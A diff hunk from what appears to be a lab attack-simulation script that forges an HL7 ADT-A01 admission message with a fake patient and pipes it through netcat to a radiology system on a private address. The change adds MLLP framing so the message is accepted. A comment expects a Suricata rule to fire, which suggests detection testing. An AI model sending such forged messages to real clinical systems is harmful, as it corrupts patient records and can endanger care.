@@ -173,7 +173,7 @@ attack_hl7_abuse() {
   run_attack "
     echo '[*] Crafting fake HL7 ADT-A01 admission message...'
     HL7_MSG='MSH|^~\&|ATTACKER|LAB|RIS|DIC|20240115120000||ADT^A01|MSG001|P|2.3\rPID|||FAKE001||HACKED^PATIENT||19800101|M|||MALICIOUS STREET'
-    echo -e \"\${HL7_MSG}\" | nc -w 3 10.10.10.20 2575 && \
+    printf '\\x0b%s\\x1c\\x0d' \"\${HL7_MSG}\" | nc -w 3 10.10.10.20 2575 && \
       echo '[+] HL7 message sent to RIS (port 2575)' || \
       echo '[*] Connection attempt made — Suricata SID 9000020 should fire'
     
